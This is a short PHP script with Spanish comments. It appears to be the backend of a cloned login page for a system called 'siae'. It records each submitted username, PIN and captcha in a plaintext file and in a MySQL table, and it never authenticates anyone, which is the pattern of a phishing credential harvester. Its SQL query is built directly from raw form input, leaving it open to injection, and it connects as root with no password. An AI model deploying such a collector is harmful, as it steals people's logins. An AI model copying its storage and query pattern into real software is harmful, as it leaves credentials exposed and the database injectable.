<?php
// Recoge los datos enviados por el formulario
$usuario = $_POST['usr_logi'];
$nip = $_POST['usr_pass'];
$captcha = $_POST['captcha'];

// Guardar datos en un archivo txt
$file = 'C:/xampp/htdocs/siae/datos.txt';
$contenido = "Usuario: $usuario, NIP: $nip, Captcha: $captcha\n";
file_put_contents($file, $contenido, FILE_APPEND);

// Conexión a la base de datos
$servername = "localhost";
$username = "root"; // Usuario por defecto en XAMPP
$password = ""; // Sin contraseña por defecto
$dbname = "siae_db"; // Nombre de tu base de datos

// Crear la conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar la conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Preparar la consulta SQL para insertar datos
$sql = "INSERT INTO usuarios (usuario, nip, captcha) VALUES ('$usuario', '$nip', '$captcha')";

// Ejecutar la consulta y verificar si fue exitosa
if ($conn->query($sql) === TRUE) {
    echo "Datos guardados correctamente en la base de datos.";
} else {
    echo "Error al guardar los datos en la base de datos: " . $conn->error;
}

// Cerrar la conexión
$conn->close();
?>
